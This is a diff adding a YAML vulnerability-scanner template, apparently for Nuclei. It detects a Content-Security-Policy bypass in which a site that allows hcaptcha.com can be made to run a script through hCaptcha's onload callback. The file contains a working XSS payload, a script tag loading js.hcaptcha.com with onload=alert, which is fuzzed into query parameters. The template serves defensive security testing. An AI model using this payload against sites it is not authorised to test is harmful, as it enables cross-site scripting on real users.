@@ -1,0 +1,55 @@
+id: hcaptcha-js-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - hCaptcha JS
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,hcaptcha-js
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "hcaptcha.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: hcaptcha_js_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://js.hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "hcaptcha_js_csp_xss == true"
+# digest: 4a0a00473045022016dbc0fd22e4fab20d472f3de55ea7e136a8fad0510ad40d9972198c8e8a56410221009dd1d1841fb18568800170e587a0829c5cd28e08934819eda99593db9466aeaf:922c64590222798bb761d5b6d8e72950
